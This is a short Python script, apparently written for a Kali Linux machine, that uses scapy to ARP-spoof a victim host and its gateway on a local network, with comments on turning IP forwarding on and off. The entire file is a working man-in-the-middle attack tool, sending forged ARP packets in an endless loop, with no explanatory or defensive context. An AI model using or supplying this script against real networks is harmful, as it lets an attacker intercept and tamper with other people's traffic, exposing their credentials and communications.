import sys
import time
from scapy.all import *

#this kali must do
# root@kali: echo 1 >> /proc/sys/net/ipv4/ip_forward
#end
# root@kali: echo 0 >> /proc/sys/net/ipv4/ip_forward

victimIP = "192.168.204.5"
gatewayIP = "192.168.204.254"

myinface = "eth0"

attackTarget = Ether()/ARP(psrc = gatewayIP,pdst = victimIP)
attackGateway = Ether()/ARP(psrc = victimIP,pdst = gatewayIP)
sendp(attackTarget,iface=myinface,inter=1,loop=1)
sendp(attackGateway,iface=myinface,inter=1,loop=1)
# print(attackTarget)
